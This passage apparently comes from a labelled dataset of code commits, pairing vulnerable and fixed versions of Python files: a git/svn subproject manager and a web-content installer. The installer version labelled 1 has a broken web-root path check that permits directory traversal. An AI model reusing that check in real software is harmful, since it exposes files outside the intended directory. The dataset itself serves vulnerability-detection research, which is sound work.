            self.checkout()
        elif not exists(self.directory + ""/.git""):
            not_a_project(self.directory, ""Git"")
        elif self.has_local_edit():
            logger.warning(""Directory '%s' contains local modifications"" % self.directory)
        else:
            with cd(self.directory):
                if self.conf.get(""shallow"", False):
                    # Fetch just the commit we need
                    fork(['git', 'fetch', '--depth', '1', 'origin', self.noremote_ref()])
                    # Notice that we need FETCH_HEAD, as the shallow clone does not recognize
                    # origin/HEAD & co.
                    fork(['git', 'checkout', 'FETCH_HEAD', '--'])
                else:
                    fork(['git', 'fetch'])
                    fork(['git', 'checkout', self.ref, '--'])

    def status(self):
        fork(['git', ""--git-dir=%s/.git"" % self.directory, ""--work-tree=%s"" % self.directory, 'status'])

    def has_local_edit(self):
        with cd(self.directory):
            return log_check_output(['git', 'status', '--porcelain']) != b""""

    @staticmethod
    def url_from_directory(directory, include_commit = True):
        with cd(directory):
            origin = log_check_output(['git', 'remote', 'get-url', 'origin'], universal_newlines=True)[:-1]
            commit = log_check_output(['git', 'log', '-1', '--format=%H'], universal_newlines=True)[:-1]
        ret = 'git+%s' % (origin,)
        if include_commit:
            ret += '#commit=%s' % (commit,)
        return ret

    def mirror(self, dst_dir):
        source_dir = self.directory
        def mkdir_p(path):
            if path.strip() != '' and not os.path.exists(path):
                os.makedirs(path)

        env = os.environ.copy()
        env['LC_MESSAGES'] = 'C'

        def tracked_files():
            p = Popen(['git', 'ls-tree', '-r', '--name-only', 'HEAD'], stdout=PIPE, env=env)
            out = p.communicate()[0]
            if p.returncode != 0 or not out.strip():
                return None
            return [e.strip() for e in out.splitlines() if os.path.exists(e)]

        def cp(src, dst):
            r, f = os.path.split(dst)
            mkdir_p(r)
            shutil.copy2(src, dst)

        with cd(source_dir):
            for t in tracked_files():
                cp(t, os.path.join(dst_dir, t.decode()))

class SvnSubproject(Subproject):
    def __init__(self, name, url, directory, options, conf = {}, **kwargs):
        super().__init__(name, directory, options, conf = {}, **kwargs)
        self.rev = 'HEAD'
        fragment = (url.fragment and Subproject._parse_fragment(url)) or {}
        rev = fragment.get('rev', None)
        branch = fragment.get('branch', None)
        tag = fragment.get('tag', None)
        if (branch or tag) and self.url.path.endswith('trunk'):
            url = url._replace(path=self.url.path[:-5])
        if branch:
            url = url._replace(path=join(url.path, 'branches', branch))
        elif tag:
            url = url._replace(path=join(url.path, 'tags', tag))
        if rev:
            url = url._replace(path=url.path + '@' + rev)
            self.rev = rev
        self.url = url._replace(fragment='')

    def same_checkout(self, other):
        if isinstance(other, SvnSubproject) and (self.url, self.rev) == (other.url, other.rev):
            return True
        return False

    def checkout(self):
        fork(['svn', 'checkout', self.url.geturl(), self.directory])

    def update(self):
        if not exists(self.directory):
            self.checkout()
        elif not exists(self.directory + ""/.svn""):
            not_a_project(self.directory, ""Subversion"")
        elif self.has_local_edit():
            logger.warning(""Directory '%s' contains local modifications"" % self.directory)
        else:
            with cd(self.directory):
                # svn switch _would be ok_ even just to perform an update, but,
                # unlike svn up, it touches the timestamp of all the files,
                # forcing full rebuilds; so, if we are already on the correct
                # url just use svn up

                # Notice that, unlike other svn commands, -r in svn up works as
                # a peg revision (the @ syntax), so it takes the URL of the
                # current working copy and looks it up in the repository _as it
                # was at the requested revision_ (or HEAD if none is specified)
                target_base,target_rev = (self.url.geturl().split('@') + [''])[:2]
                if target_base == self.url_from_checkout(include_commit = False):
                    fork(['svn', 'up'] + ([""-r"" + target_rev] if target_rev else []))
                else:
                    fork(['svn', 'switch', self.url.geturl()])

    def status(self):
        fork(['svn', 'status', self.directory])

    def has_local_edit(self):
        xml = log_check_output(['svn', 'st', '--xml', self.directory], universal_newlines=True)
        doc = ElementTree.fromstring(xml)
        for entry in doc.findall('./status/target/entry[@path=""%s""]/entry[@item=""modified""]' % self.directory):
            return True
        return False

    @staticmethod
    def url_from_directory(directory, include_commit = True):
        xml = log_check_output(['svn', 'info', '--xml', directory], universal_newlines=True)
        doc = ElementTree.fromstring(xml)
        ret = doc.findall('./entry/url')[0].text
        if include_commit:
            ret += ""@"" + doc.findall('./entry/commit')[0].get('revision')
        return ret

    def mirror(self, dst, quick = False):
        import shutil
        src = self.directory

        os.chdir(src)
        if not quick and isdir(dst):
            shutil.rmtree(dst)
        if not isdir(dst):
            os.makedirs(dst)

        # Forziamo il locale a inglese, perché parseremo l'output di svn e non
        # vogliamo errori dovuti alle traduzioni.
        env = os.environ.copy()
        env[""LC_MESSAGES""] = ""C""

        dirs = ["".""]

        # Esegue svn info ricorsivamente per iterare su tutti i file versionati.
        for D in dirs:
            infos = {}
            for L in Popen([""svn"", ""info"", ""--recursive"", D], stdout=PIPE, env=env).stdout:
                L = L.decode()
                if L.strip():
                    k,v = L.strip().split("": "", 1)
                    infos[k] = v
                else:
                    if infos[""Schedule""] == ""delete"":
                        continue
                    fn = infos[""Path""]
                    infos = {}
                    if fn == ""."":
                        continue
                    fn1 = join(src, fn)
                    fn2 = join(dst, fn)
                    if isdir(fn1):
                        if not isdir(fn2):
                            os.makedirs(fn2)
                    elif not quick or newer(fn1, fn2):
                        shutil.copy2(fn1, fn2)

def generate_cmake_script(source_dir, url=None, options=None, print_tree=False,update=True):
    root, modules = Subproject.create_dependency_tree(source_dir, url, options, update=update)
    if print_tree:
        print(json.dumps(root.toJSON(), indent=4))
    conf = load_conf(source_dir)
    if update and conf is not None:
        subproject_dir = join(source_dir, conf.get(""subprojects_dir"", 'lib'))

        cmakelists_rows = []
        processed = set()

        def dump_options(module):
            for key, value in sorted(module.options.items()):
                if value is None:
                    cmakelists_rows.append('unset(%s CACHE)\n' % (key))
                    continue
                elif isinstance(value, bool):
                    kind = ""BOOL""
                    value = 'ON' if value else 'OFF'
                else:
                    kind = ""STRING""
                cmakelists_rows.append('set(%s %s CACHE INTERNAL """" FORCE)\n' % (key, value))

        def process_module(module):
            # notice: if a module is marked as excluded from cmake we also
            # exclude its dependencies; they are nonetheless included if they
            # are required by another module which is not excluded from cmake
            if module.name in processed or module.exclude_from_cmake:
                return
            processed.add(module.name)
            # first add the dependent modules
            # module.children is a set, whose iteration order changes from run to run
            # make this deterministic (we want to generate always the same CMakeLists.txt)
            for c in sorted(module.children, key = lambda x: x.name):
                process_module(c)
            # dump options and add to the generated CMakeLists.txt
            dump_options(module)
            if module is not root and exists(join(module.directory, ""CMakeLists.txt"")):
                cmakelists_rows.append('add_subdirectory(%s)\n' % (module.directory))

        process_module(root)

        # write only if different
        cmakelists_data = ''.join(cmakelists_rows)
        try:
            with open(join(subproject_dir, 'CMakeLists.txt'), 'r') as f:
                if cmakelists_data == f.read():
                    # nothing to do, avoid touching the file (which often yields a full rebuild)
                    return
        except IOError:
            pass
        # actually write the file
        with open(join(subproject_dir, 'CMakeLists.txt'), 'w') as f:
            f.write(cmakelists_data)

/n/n/n",0
107,136576b3d9c82ec53d67c3b273b6bb356312d763,"/quark/subproject.py/n/nimport logging
import json
import os
from os.path import exists, join, isdir
from shutil import rmtree
from subprocess import call, PIPE, Popen, CalledProcessError, run
from urllib.parse import urlparse
import shutil

import xml.etree.ElementTree as ElementTree

from quark.utils import DirectoryContext as cd, fork, log_check_output
from quark.utils import freeze_file, dependency_file, mkdir, load_conf

logger = logging.getLogger(__name__)

class QuarkError(RuntimeError):
    pass

def url_from_directory(directory, include_commit = True):
    if exists(join(directory, "".svn"")):
        cls = SvnSubproject
    elif exists(join(directory, "".git"")):
        cls = GitSubproject
    else:
        raise QuarkError(""Couldn't detect repository type for directory %s"" % directory)
    return cls.url_from_directory(directory, include_commit)

def not_a_project(directory, proj_type):
    raise QuarkError(""""""

Directory '%s' isn't a %s sandbox,
but it's marked as such in a subproject.quark.

Either:
- it was previously a subproject of a different kind (e.g. the catalog changed
  it from Subversion to Git);
- it's committed in the root project;
- it's a local modification.

Please remove it and re-run quark up.
"""""" % (directory, proj_type))



class Subproject:
    @staticmethod
    def _parse_fragment(url):
        res = {}
        for equality in url.fragment.split():
            index = equality.find('=')
            key = equality[:index]
            value = equality[index + 1:]
            res[key] = value
        return res

    @staticmethod
    def create(name, urlstring, directory, options, conf = {}, **kwargs):
        url = urlparse(urlstring)
        args = (name, url, directory, options, conf)
        if urlstring is None:
            # fake project, used for non-versioned root
            res = Subproject(name, directory, options, conf, **kwargs)
        elif url.scheme.startswith('git'):
            res = GitSubproject(*args, **kwargs)
        elif url.scheme.startswith('svn'):
            res = SvnSubproject(*args, **kwargs)
        else:
            raise ValueError(""Unrecognized dependency for url '%s'"", urlstring)
        res.urlstring = urlstring
        return res

    @staticmethod
    def create_dependency_tree(source_dir, url=None, options=None, update=False):
        source_dir_rp = os.path.realpath(source_dir)
        root = Subproject.create(""root"", url, source_dir, {}, {}, toplevel = True)
        if url and update:
            root.checkout()
        conf = load_conf(source_dir)
        if conf is None:
            return root, {}
        subproject_dir = join(source_dir, conf.get(""subprojects_dir"", 'lib'))
        stack = [root]
        modules = {}

        def get_option(key):
            try:
                return root.options[key]
            except KeyError as e:
                err = e
            for module in modules.values():
                try:
                    return module.options[key]
                except KeyError as e:
                    err = e
            raise err

        def add_module(parent, name, uri, options, conf, **kwargs):
            if uri is None:
                # options add only, lookup from existing modules
                uri = modules[name].urlstring
            target_dir = join(subproject_dir, name)
            target_dir_rp = os.path.realpath(target_dir)
            if not target_dir_rp.startswith(source_dir_rp):
                raise QuarkError(""""""
Subproject `%s` (URI: %s)
is trying to escape from the main project directory (`%s`)
subproject realpath:   %s
main project realpath: %s"""""" % (name, uri, source_dir, target_dir_rp, source_dir_rp))
            newmodule = Subproject.create(name, uri, target_dir, options, conf, **kwargs)
            mod = modules.setdefault(name, newmodule)
            if mod is newmodule:
                mod.parents.add(parent)
                if update:
                    mod.update()
            else:
                if newmodule.exclude_from_cmake != mod.exclude_from_cmake:
                    children_conf = [join(parent.directory, dependency_file) for parent in mod.parents]
                    parent_conf = join(parent.directory, dependency_file)
                    raise ValueError(""Conflicting value of 'exclude_from_cmake'""
                                     "" attribute for module '%s': %r required by %s and %r required by %s"" %
                                     (name, mod.exclude_from_cmake, children_conf, newmodule.exclude_from_cmake,
                                      parent_conf)
                                     )
                if not newmodule.same_checkout(mod) and uri is not None:
                    children = [join(parent.directory, dependency_file) for parent in mod.parents]
                    parent = join(parent.directory, dependency_file)
                    raise ValueError(
                        ""Conflicting URLs for module '%s': '%s' required by %s and '%s' required by '%s'"" %
                        (name,
                         mod.urlstring, children,
                         newmodule.urlstring, parent))

                else:
                    for key, value in options.items():
                        mod.options.setdefault(key, value)
                        if mod.options[key] != value:
                            raise ValueError(
                                ""Conflicting values option '%s' of module '%s'"" % (key, mod.name)
                            )
            stack.append(mod)
            parent.children.add(mod)

        freeze_conf = join(root.directory, freeze_file)
        if exists(freeze_conf):
            with open(freeze_conf, 'r') as f:
                freeze_dict = json.load(f)
        else:
            freeze_dict = {}
        if update:
            mkdir(subproject_dir)
        while len(stack):
            current_module = stack.pop()
            if current_module.external_project:
                generate_cmake_script(current_module.directory, update = update)
                continue
            conf = load_conf(current_module.directory)
            if conf:
                if current_module.toplevel:
                    current_module.options = conf.get('toplevel_options', {})
                    if options:
                        current_module.options.update(options)
                for name, depobject in conf.get('depends', {}).items():
                    external_project = depobject.get('external_project', False)
                    add_module(current_module, name,
                               freeze_dict.get(name, depobject.get('url', None)), depobject.get('options', {}),
                               depobject,
                               exclude_from_cmake=depobject.get('exclude_from_cmake', external_project),
                               external_project=external_project,
                               )
                for key, optobjects in conf.get('optdepends', {}).items():
                    if isinstance(optobjects, dict):
                        optobjects = [optobjects]
                    for optobject in optobjects:
                        try:
                            value = get_option(key)
                        except KeyError:
                            continue
                        if value == optobject['value']:
                            for name, depobject in optobject['depends'].items():
                                add_module(current_module, name,
                                           freeze_dict.get(name, depobject.get('url', None)),
                                           depobject.get('options', {}),
                                           depobject)
        return root, modules

    def __init__(self, name=None, directory=None, options=None, conf = {}, exclude_from_cmake=False, external_project=False, toplevel = False):
        self.conf = conf
        self.parents = set()
        self.children = set()
        self.name = name
        self.directory = directory
        self.options = options or {}
        self.exclude_from_cmake = exclude_from_cmake
        self.external_project = external_project
        self.toplevel = toplevel

    def __hash__(self):
        return self.name.__hash__()

    def same_checkout(self, other):
        return True

    def checkout(self):
        raise NotImplementedError()

    def update(self):
        raise NotImplementedError()

    def status(self):
        print(""Unsupported external %s"" % self.directory)

    def local_edit(self):
        raise NotImplementedError()

    def url_from_checkout(self, *args, **kwargs):
        return self.url_from_directory(directory = self.directory, *args, **kwargs)

    def mirror(self, dest):
        raise NotImplementedError()

    def toJSON(self):
        return {
            ""name"": self.name,
            ""children"": [child.toJSON() for child in self.children],
            ""options"": self.options,
        }


class GitSubproject(Subproject):
    def __init__(self, name, url, directory, options, conf = {}, **kwargs):
        super().__init__(name, directory, options, conf, **kwargs)
        self.ref_is_commit = False
        self.ref = 'origin/HEAD'
        if url.fragment:
            fragment = Subproject._parse_fragment(url)
            if 'commit' in fragment:
                self.ref = fragment['commit']
                self.ref_is_commit = True
            elif 'tag' in fragment:
                self.ref = fragment['tag']
            elif 'branch' in fragment:
                self.ref = 'origin/%s' % fragment['branch']
        self.url = url._replace(fragment='')._replace(scheme=url.scheme.replace('git+', ''))

    def same_checkout(self, other):
        if isinstance(other, GitSubproject) and (self.url, self.ref, self.conf.get(""shallow"", False)) == (other.url, other.ref, other.conf.get(""shallow"", False)):
            return True
        return False

    def check_origin(self):
        with cd(self.directory):
            if log_check_output(['git', 'config', '--get', 'remote.origin.url']) != self.url:
                if not self.has_local_edit():
                    logger.warning(""%s is not a clone of %s ""
                                   ""but it hasn't local modifications, ""
                                   ""removing it.."", self.directory, self.url.geturl())
                    rmtree(self.directory)
                    self.checkout()
                else:
                    raise ValueError(
                        ""'%s' is not a clone of '%s' and has local""
                        "" modifications, I don't know what to do with it..."" %
                        self.directory, self.url.geturl())

    def noremote_ref(self):
        nr_ref = self.ref
        if '/' in nr_ref:
            nr_ref = nr_ref.split('/', 1)[1]
        return nr_ref


    def checkout(self):
        shallow = self.conf.get(""shallow"", False)

        if self.ref_is_commit and shallow:
            # We cannot straight clone a shallow repo using a commit hash (-b doesn't support it)
            # do the dance described at https://stackoverflow.com/a/43136160/214671
            os.mkdir(self.directory)
            with cd(self.directory):
                fork(['git', 'init'])
                fork(['git', 'remote', 'add', 'origin', self.url.geturl()])
                fork(['git', 'fetch', '--depth', '1', 'origin', self.noremote_ref()])
                fork(['git', 'checkout', self.ref])
        else:
            # Regular case
            extra_opts = []
            if shallow:
                extra_opts += [""--depth"", ""1""]
            # Needed essentially for the shallow case, as for full clones the
            # git clone -n + git checkout would suffice
            if not self.ref_is_commit and self.ref != 'origin/HEAD':
                extra_opts += ['-b', self.noremote_ref()]
            fork(['git', 'clone', '-n'] + extra_opts + ['--', self.url.geturl(), self.directory])
            with cd(self.directory):
                fork(['git', 'checkout', self.ref, '--'])

    def update(self):
        if not exists(self.directory):
            self.checkout()
        elif not exists(self.directory + ""/.git""):
            not_a_project(self.directory, ""Git"")
        elif self.has_local_edit():
            logger.warning(""Directory '%s' contains local modifications"" % self.directory)
        else:
            with cd(self.directory):
                if self.conf.get(""shallow"", False):
                    # Fetch just the commit we need
                    fork(['git', 'fetch', '--depth', '1', 'origin', self.noremote_ref()])
                    # Notice that we need FETCH_HEAD, as the shallow clone does not recognize
                    # origin/HEAD & co.
                    fork(['git', 'checkout', 'FETCH_HEAD', '--'])
                else:
                    fork(['git', 'fetch'])
                    fork(['git', 'checkout', self.ref, '--'])

    def status(self):
        fork(['git', ""--git-dir=%s/.git"" % self.directory, ""--work-tree=%s"" % self.directory, 'status'])

    def has_local_edit(self):
        with cd(self.directory):
            return log_check_output(['git', 'status', '--porcelain']) != b""""

    @staticmethod
    def url_from_directory(directory, include_commit = True):
        with cd(directory):
            origin = log_check_output(['git', 'remote', 'get-url', 'origin'], universal_newlines=True)[:-1]
            commit = log_check_output(['git', 'log', '-1', '--format=%H'], universal_newlines=True)[:-1]
        ret = 'git+%s' % (origin,)
        if include_commit:
            ret += '#commit=%s' % (commit,)
        return ret

    def mirror(self, dst_dir):
        source_dir = self.directory
        def mkdir_p(path):
            if path.strip() != '' and not os.path.exists(path):
                os.makedirs(path)

        env = os.environ.copy()
        env['LC_MESSAGES'] = 'C'

        def tracked_files():
            p = Popen(['git', 'ls-tree', '-r', '--name-only', 'HEAD'], stdout=PIPE, env=env)
            out = p.communicate()[0]
            if p.returncode != 0 or not out.strip():
                return None
            return [e.strip() for e in out.splitlines() if os.path.exists(e)]

        def cp(src, dst):
            r, f = os.path.split(dst)
            mkdir_p(r)
            shutil.copy2(src, dst)

        with cd(source_dir):
            for t in tracked_files():
                cp(t, os.path.join(dst_dir, t.decode()))

class SvnSubproject(Subproject):
    def __init__(self, name, url, directory, options, conf = {}, **kwargs):
        super().__init__(name, directory, options, conf = {}, **kwargs)
        self.rev = 'HEAD'
        fragment = (url.fragment and Subproject._parse_fragment(url)) or {}
        rev = fragment.get('rev', None)
        branch = fragment.get('branch', None)
        tag = fragment.get('tag', None)
        if (branch or tag) and self.url.path.endswith('trunk'):
            url = url._replace(path=self.url.path[:-5])
        if branch:
            url = url._replace(path=join(url.path, 'branches', branch))
        elif tag:
            url = url._replace(path=join(url.path, 'tags', tag))
        if rev:
            url = url._replace(path=url.path + '@' + rev)
            self.rev = rev
        self.url = url._replace(fragment='')

    def same_checkout(self, other):
        if isinstance(other, SvnSubproject) and (self.url, self.rev) == (other.url, other.rev):
            return True
        return False

    def checkout(self):
        fork(['svn', 'checkout', self.url.geturl(), self.directory])

    def update(self):
        if not exists(self.directory):
            self.checkout()
        elif not exists(self.directory + ""/.svn""):
            not_a_project(self.directory, ""Subversion"")
        elif self.has_local_edit():
            logger.warning(""Directory '%s' contains local modifications"" % self.directory)
        else:
            with cd(self.directory):
                # svn switch _would be ok_ even just to perform an update, but,
                # unlike svn up, it touches the timestamp of all the files,
                # forcing full rebuilds; so, if we are already on the correct
                # url just use svn up

                # Notice that, unlike other svn commands, -r in svn up works as
                # a peg revision (the @ syntax), so it takes the URL of the
                # current working copy and looks it up in the repository _as it
                # was at the requested revision_ (or HEAD if none is specified)
                target_base,target_rev = (self.url.geturl().split('@') + [''])[:2]
                if target_base == self.url_from_checkout(include_commit = False):
                    fork(['svn', 'up'] + ([""-r"" + target_rev] if target_rev else []))
                else:
                    fork(['svn', 'switch', self.url.geturl()])

    def status(self):
        fork(['svn', 'status', self.directory])

    def has_local_edit(self):
        xml = log_check_output(['svn', 'st', '--xml', self.directory], universal_newlines=True)
        doc = ElementTree.fromstring(xml)
        for entry in doc.findall('./status/target/entry[@path=""%s""]/entry[@item=""modified""]' % self.directory):
            return True
        return False

    @staticmethod
    def url_from_directory(directory, include_commit = True):
        xml = log_check_output(['svn', 'info', '--xml', directory], universal_newlines=True)
        doc = ElementTree.fromstring(xml)
        ret = doc.findall('./entry/url')[0].text
        if include_commit:
            ret += ""@"" + doc.findall('./entry/commit')[0].get('revision')
        return ret

    def mirror(self, dst, quick = False):
        import shutil
        src = self.directory

        os.chdir(src)
        if not quick and isdir(dst):
            shutil.rmtree(dst)
        if not isdir(dst):
            os.makedirs(dst)

        # Forziamo il locale a inglese, perché parseremo l'output di svn e non
        # vogliamo errori dovuti alle traduzioni.
        env = os.environ.copy()
        env[""LC_MESSAGES""] = ""C""

        dirs = ["".""]

        # Esegue svn info ricorsivamente per iterare su tutti i file versionati.
        for D in dirs:
            infos = {}
            for L in Popen([""svn"", ""info"", ""--recursive"", D], stdout=PIPE, env=env).stdout:
                L = L.decode()
                if L.strip():
                    k,v = L.strip().split("": "", 1)
                    infos[k] = v
                else:
                    if infos[""Schedule""] == ""delete"":
                        continue
                    fn = infos[""Path""]
                    infos = {}
                    if fn == ""."":
                        continue
                    fn1 = join(src, fn)
                    fn2 = join(dst, fn)
                    if isdir(fn1):
                        if not isdir(fn2):
                            os.makedirs(fn2)
                    elif not quick or newer(fn1, fn2):
                        shutil.copy2(fn1, fn2)

def generate_cmake_script(source_dir, url=None, options=None, print_tree=False,update=True):
    root, modules = Subproject.create_dependency_tree(source_dir, url, options, update=update)
    if print_tree:
        print(json.dumps(root.toJSON(), indent=4))
    conf = load_conf(source_dir)
    if update and conf is not None:
        subproject_dir = join(source_dir, conf.get(""subprojects_dir"", 'lib'))

        cmakelists_rows = []
        processed = set()

        def dump_options(module):
            for key, value in sorted(module.options.items()):
                if value is None:
                    cmakelists_rows.append('unset(%s CACHE)\n' % (key))
                    continue
                elif isinstance(value, bool):
                    kind = ""BOOL""
                    value = 'ON' if value else 'OFF'
                else:
                    kind = ""STRING""
                cmakelists_rows.append('set(%s %s CACHE INTERNAL """" FORCE)\n' % (key, value))

        def process_module(module):
            # notice: if a module is marked as excluded from cmake we also
            # exclude its dependencies; they are nonetheless included if they
            # are required by another module which is not excluded from cmake
            if module.name in processed or module.exclude_from_cmake:
                return
            processed.add(module.name)
            # first add the dependent modules
            # module.children is a set, whose iteration order changes from run to run
            # make this deterministic (we want to generate always the same CMakeLists.txt)
            for c in sorted(module.children, key = lambda x: x.name):
                process_module(c)
            # dump options and add to the generated CMakeLists.txt
            dump_options(module)
            if module is not root and exists(join(module.directory, ""CMakeLists.txt"")):
                cmakelists_rows.append('add_subdirectory(%s)\n' % (module.directory))

        process_module(root)

        # write only if different
        cmakelists_data = ''.join(cmakelists_rows)
        try:
            with open(join(subproject_dir, 'CMakeLists.txt'), 'r') as f:
                if cmakelists_data == f.read():
                    # nothing to do, avoid touching the file (which often yields a full rebuild)
                    return
        except IOError:
            pass
        # actually write the file
        with open(join(subproject_dir, 'CMakeLists.txt'), 'w') as f:
            f.write(cmakelists_data)

/n/n/n",1
108,76918b12c408529eaf04f75917f128f56e250111,"pyweb/pyweb_add_content.py/n/n#!/usr/bin/env python3

import argparse
import logging
import os
import shutil

from .pyweb import (# DEFAULT_PYWEB_HOME,
                    # DEFAULT_PYWEB_VAR,
                    DEFAULT_PYWEB_CONTENT_DIR,
                    DEFAULT_PYWEB_LOG_DIR)


class ContentInstallerException(Exception):
    pass

class ContentInstaller:
    def __init__(self, src_path, dst_path, www_root, logger=None):
        self.logger = logger or logging.getLogger(""ContentInstaller"")
        _src, _dst, _www = self._sanity_check_path(src_path, dst_path, www_root)
        self.src_path = _src
        self.dst_path = _dst
        self.www_root = _www


    def _sanity_check_path(self, src, dst, www_root):
        logger = self.logger
        if not os.path.isdir(src):
            msg = ""Source path: %s does not exist or is not a directory."" % src
            logger.critical(msg)
            raise ContentInstallerException(msg)

        if not os.path.isdir(www_root):
            msg = ""Web root % s does not exist or is not a directory."" % src
            logger.critical(msg)
            raise ContentInstallerException(msg)

        www_root_abs = os.path.abspath(www_root)

        rel_dst = dst
        if os.path.isabs(dst):
            _dst = os.path.realpath(dst)
            _root = os.path.commonprefix([www_root_abs, _dst])
            if _root is not www_root_abs:
                msg = ""Destination path is absolute and is not a subdirectory of web root. {}"".format([www_root, dst])
                logger.critical(msg)
                raise ContentInstallerException(msg)

            rel_dst = os.path.relpath(_dst, www_root_abs)
        else:
            _dst = os.path.join(www_root_abs, dst)
            _dst = os.path.realpath(_dst)
            _root = os.path.commonprefix([www_root_abs, _dst])
            if _root is not www_root_abs:
                msg = ""Destination is a relative path that resolves outside of web root. {}"".format([www_root_abs, dst])
                logger.critical(msg)
                raise ContentInstallerException(msg)

            rel_dst = os.path.relpath(_dst, www_root_abs)

        abs_dst = os.path.join(www_root_abs, rel_dst)
        if os.path.exists(abs_dst):
            msg = ""Destination directory already exists: {}"".format(abs_dst)
            logger.critical(msg)
            raise ContentInstallerException(msg)

        return (src, rel_dst, www_root_abs)

    def install(self):
        logger = self.logger
        src_path = self.src_path
        dst_path = os.path.join(self.www_root, self.dst_path)
        logger.info(""Copying %s to %s"" % (src_path, dst_path))
        try:
            shutil.copytree(src_path, dst_path, symlinks=True)
        except Exception as e:
            logger.critical(""Exception: {}"".format(e))
            raise


def parse_args(argv):
    parser = argparse.ArgumentParser()

    parser.add_argument(""content_src_dir"", help=""Source directory containing content to be intalled."")
    parser.add_argument(""content_dst_dir"", help=""Name of directory under <WWW-ROOT> for content to be located."")
    parser.add_argument(""--www-root"", help=""WWW root path to install to."")
    parser.add_argument(""--log-path"", help=""Directory to write logfiles to."")
    args = parser.parse_args(argv)

    return args


def main(argv):
    args = parse_args(argv)
    src_dir = args.content_src_dir
    dst_dir = args.content_dst_dir

    www_root = args.www_root or DEFAULT_PYWEB_CONTENT_DIR
    logpath = args.log_path or DEFAULT_PYWEB_LOG_DIR

    logging.basicConfig(filename=os.path.join(logpath, ""pyweb-installer.log""), level=logging.DEBUG)

    logger = logging.getLogger(""pyweb-installer"")
    print(""Installing %s"" % src_dir)
    print(""Logging to %s"" % os.path.join(logpath, ""pyweb-installer.log""))
    try:
        installer = ContentInstaller(src_dir, dst_dir, www_root, logger=logger)
        installer.install()
    except Exception as e:
        print(""Installation failed: %s"" % str(e))
        logger.critical(""Installation failed."")
        exit(1)

    print(""Installation complete."")
    logger.info(""Installation complete."")
/n/n/n",0
109,76918b12c408529eaf04f75917f128f56e250111,"/pyweb/pyweb_add_content.py/n/n#!/usr/bin/env python3

import argparse
import logging
import os
import shutil

from .pyweb import (# DEFAULT_PYWEB_HOME,
                    # DEFAULT_PYWEB_VAR,
                    DEFAULT_PYWEB_CONTENT_DIR,
                    DEFAULT_PYWEB_LOG_DIR)


class ContentInstallerException(Exception):
    pass

class ContentInstaller:
    def __init__(self, src_path, dst_path, www_root, logger=None):
        self.logger = logger or logging.getLogger(""ContentInstaller"")
        _src, _dst, _www = self._sanity_check_path(src_path, dst_path, www_root)
        self.src_path = _src
        self.dst_path = _dst
        self.www_root = _www


    def _sanity_check_path(self, src, dst, www_root):
        logger = self.logger
        if not os.path.isdir(src):
            msg = ""Source path: %s does not exist or is not a directory."" % src
            logger.critical(msg)
            raise ContentInstallerException(msg)

        if not os.path.isdir(www_root):
            msg = ""Web root % s does not exist or is not a directory."" % src
            logger.critical(msg)
            raise ContentInstallerException(msg)

        www_root_abs = os.path.abspath(www_root)

        rel_dst = dst
        if os.path.isabs(dst):
            _root = os.path.commonprefix([www_root_abs, dst])
            if _root is not www_root_abs:
                msg = ""Destination path is absolute and is not a subdirectory of web root. {}"".format([www_root, dst])
                logger.critical(msg)
                raise ContentInstallerException(msg)
            rel_dst = os.path.relpath(www_root_abs, dst)
        else:
            _dst = os.path.join(www_root_abs, dst)
            _dst = os.path.realpath(_dst)
            _root = os.path.commonprefix([www_root_abs, _dst])
            if _root is not www_root_abs:
                msg = ""Destination is a relative path that resolves outside of web root. {}"".format([www_root_abs, dst])
                logger.critical(msg)
                raise ContentInstallerException(msg)
            rel_dst = os.path.relpath(www_root_abs, _dst)

        abs_dst = os.path.join(www_root_abs, rel_dst)
        if os.path.exists(abs_dst):
            msg = ""Destination directory already exists: {}"".format(abs_dst)
            logger.critical(msg)
            raise ContentInstallerException(msg)

        return (src, rel_dst, www_root_abs)

    def install(self):
        logger = self.logger
        src_path = self.src_path
        dst_path = os.path.join(self.www_root, self.dst_path)
        logger.info(""Copying %s to %s"" % (src_path, dst_path))
        try:
            shutil.copytree(src_path, dst_path, symlinks=True)
        except Exception as e:
            logger.critical(""Exception: {}"".format(e))
            raise


def parse_args(argv):
    parser = argparse.ArgumentParser()

    parser.add_argument(""content_src_dir"", help=""Source directory containing content to be intalled."")
    parser.add_argument(""content_dst_dir"", help=""Name of directory under <WWW-ROOT> for content to be located."")
    parser.add_argument(""--www-root"", help=""WWW root path to install to."")
    parser.add_argument(""--log-path"", help=""Directory to write logfiles to."")
    args = parser.parse_args(argv)

    return args


def main(argv):
    args = parse_args(argv)
    src_dir = args.content_src_dir
    dst_dir = args.content_dst_dir

    www_root = args.www_root or DEFAULT_PYWEB_CONTENT_DIR
    logpath = args.log_path or DEFAULT_PYWEB_LOG_DIR

    logging.basicConfig(filename=os.path.join(logpath, ""pyweb-installer.log""), level=logging.DEBUG)

    logger = logging.getLogger(""pyweb-installer"")
    print(""Installing %s"" % src_dir)
    print(""Logging to %s"" % os.path.join(logpath, ""pyweb-installer.log""))
    try:
        installer = ContentInstaller(src_dir, dst_dir, www_root, logger=logger)
        installer.install()
    except Exception as e:
        print(""Installation failed: %s"" % str(e))
        logger.critical(""Installation failed."")
        exit(1)

    print(""Installation complete."")
    logger.info(""Installation complete."")
/n/n/n",1
110,061f01edaa5a69c4777bdf59916f73a484dd8130,"scripts/ansible-role-requirements-editor.py/n/n#!/usr/bin/env python2.7
#
# Copyright 2016, Rackspace US, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# (c) 2016, Jesse Pretorius <jesse.pretorius@rackspace.co.uk>
#


""""""Read/write ansible-role-requirements.yml content from the CLI.""""""


from __future__ import print_function

import argparse
import os
import sys
import yaml


# To ensure that the dicts are always output in the same order
# we setup a representation for dict objects and register it
# with the yaml class.
def represent_dict(self, data):
    def key_function((key, value)):
        # Prioritizes certain keys when sorting.
        prio = {""model"": 0, ""pk"": 1, ""fields"": 2}.get(key, 99)
        return (prio, key)
    items = data.items()
    items.sort(key=key_function)
    return self.represent_mapping(u'tag:yaml.org,2002:map', items)

yaml.add_representer(dict, represent_dict)


def main():
    """"""Run the main application.""""""

    # Setup argument parsing
    parser = argparse.ArgumentParser(
        description='ansible-role-requirements.yml CLI editor',
        epilog='Licensed ""Apache 2.0""')

    parser.add_argument(
        '-f',
        '--file',
